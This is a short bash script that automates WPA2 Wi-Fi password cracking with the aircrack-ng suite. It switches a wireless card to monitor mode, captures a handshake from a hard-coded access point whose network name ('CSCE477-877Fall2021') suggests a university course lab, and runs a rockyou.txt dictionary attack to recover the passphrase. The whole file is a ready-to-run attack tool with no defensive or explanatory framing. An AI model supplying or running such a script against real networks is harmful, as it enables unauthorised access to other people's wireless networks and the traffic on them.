#!/bin/bash

# WPA2 Cracking Script using aircrack-ng
# Ensure you have the required tools installed: airmon-ng, airodump-ng, aircrack-ng

# Variables
INTERFACE="wlan0"         # Your wireless interface (e.g., wlan0)
MON_INTERFACE="wlan0mon"  # Monitor mode interface
BSSID="E8:9F:80:03:C5:E2" # Target access point MAC address
CHANNEL="3"               # Target channel
ESSID="CSCE477-877Fall2021" # Target network name
CAPTURE_FILE="handshake"  # File to store the capture handshake
DICTIONARY_FILE="rockyou.txt" # Path to the password dictionary file

# Step 1: Put the wireless interface into monitor mode
echo "[*] Putting interface $INTERFACE into monitor mode..."
airmon-ng start $INTERFACE

# Step 2: Start airodump-ng to capture the handshake
echo "[*] Starting airodump-ng on channel $CHANNEL targeting BSSID $BSSID..."
airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_FILE $MON_INTERFACE &

# Step 3: Wait for the handshake to be captured
echo "[*] Waiting for handshake to be captured..."
sleep 60 # Adjust this as needed

# Step 4: Terminate airodump-ng after handshake capture
echo "[*] Stopping airodump-ng..."
pkill airodump-ng

# Step 5: Crack the WPA2 password using aircrack-ng
echo "[*] Cracking the WPA2 password using aircrack-ng..."
aircrack-ng -w $DICTIONARY_FILE -b $BSSID ${CAPTURE_FILE}*.cap

# Cleanup: Stop monitor mode and return the interface to managed mode
echo "[*] Stopping monitor mode on $MON_INTERFACE..."
airmon-ng stop $MON_INTERFACE

echo "[*] WPA2 cracking attempt finished."

